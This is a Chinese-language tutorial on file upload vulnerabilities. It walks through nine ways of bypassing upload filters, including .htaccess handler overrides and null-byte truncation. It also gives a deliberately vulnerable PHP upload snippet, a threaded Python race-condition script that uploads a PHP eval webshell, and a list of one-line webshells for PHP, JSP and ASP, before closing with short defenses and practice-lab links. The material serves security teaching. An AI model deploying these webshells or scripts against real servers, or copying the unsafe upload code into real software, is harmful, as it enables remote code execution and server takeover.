---
title: 文件上传漏洞
description: 文件上传漏洞原理与绕过技巧。
date: 2026-06-21T02:00:00.000Z
---


## 文件上传漏洞

文件上传漏洞是指 Web 应用允许用户上传文件，但未对上传的文件进行严格的安全检查，导致攻击者可以上传恶意文件（如 Webshell）获取服务器权限。

### 什么是文件上传漏洞？

文件上传漏洞的本质是应用程序没有正确验证上传文件的类型和内容。攻击者可以利用这一点上传恶意脚本（如 PHP、JSP 文件），然后通过浏览器访问这些脚本来执行任意代码。

这种漏洞通常出现在用户头像上传、文档管理、图片分享等功能中。

### 危害

- **服务器控制**：上传 Webshell 获取服务器权限
- **数据泄露**：读取服务器上的敏感文件
- **持久化后门**：在服务器上留下持久化访问方式
- **横向渗透**：以服务器为跳板攻击内网

---

### 一、漏洞原理

```php
// 危险的上传代码
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
}
```

攻击者可以上传 PHP 一句话木马，通过浏览器访问执行。

---

### 二、绕过方法

#### 1. 后缀名绕过

```
.php → .php3, .php5, .phtml, .pht, .phps
```

**服务器配置（.htaccess）：**

```apache
AddType application/x-httpd-php .php3 .php5 .phtml
```

#### 2. MIME 类型绕过

将 `Content-Type` 修改为允许的类型：

```
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/gif
```

#### 3. 文件头绕过

在文件开头添加图片文件头：

```
GIF89a  (GIF 文件头)
FF D8 FF E0  (JPEG 文件头)
89 50 4E 47  (PNG 文件头)
```

#### 4. 双重后缀名

```
shell.php.jpg
shell.jpg.php
shell.php.xxx
```

#### 5. 空字节截断

```
shell.php%00.jpg
```

PHP < 5.3.4 有效。

#### 6. .htaccess 上传

上传 `.htaccess` 文件修改解析规则：

```apache
# 方法一
AddType application/x-httpd-php .jpg

# 方法二
SetHandler application/x-httpd-php
```

#### 7. 大小写绕过

```
shell.pHp
shell.PhP
```

#### 8. 点和空格绕过

```
shell.php.
shell.php 
shell.php....
```

#### 9. 条件竞争

```python
# 上传文件的同时不断访问
import threading
import requests

url_upload = "http://target.com/upload.php"
url_access = "http://target.com/uploads/shell.php"

def upload():
    while True:
        files = {'file': ('shell.php', '<?php eval($_POST["cmd"]);?>', 'image/jpeg')}
        requests.post(url_upload, files=files)

def access():
    while True:
        r = requests.get(url_access)
        if r.status_code == 200:
            print("[+] Shell accessible!")
            break

for i in range(10):
    threading.Thread(target=upload).start()
for i in range(10):
    threading.Thread(target=access).start()
```

---

### 三、一句话木马

```php
// PHP
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php assert($_POST['cmd']); ?>
<?php @eval($_REQUEST['a']); ?>

// JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

// ASP
<% eval request("cmd") %>
```

---

### 四、菜刀 / 蚁剑 / 哥斯拉

| 工具 | 特点 |
|------|------|
| 菜刀（Chopper） | 轻量、经典 |
| 蚁剑（AntSword） | 功能丰富、插件多 |
| 哥斯拉（Godzilla） | 加密通信、免杀 |

---

### 五、防御方法

1. **白名单验证**：只允许特定后缀
2. **重命名文件**：随机文件名
3. **文件内容检测**：检查文件头
4. **上传目录隔离**：禁止执行权限
5. **云存储**：文件上传到 OSS

---

### 六、练习平台

- [upload-labs](https://github.com/c0ny1/upload-labs)
- [DVWA](https://github.com/digininja/DVWA)
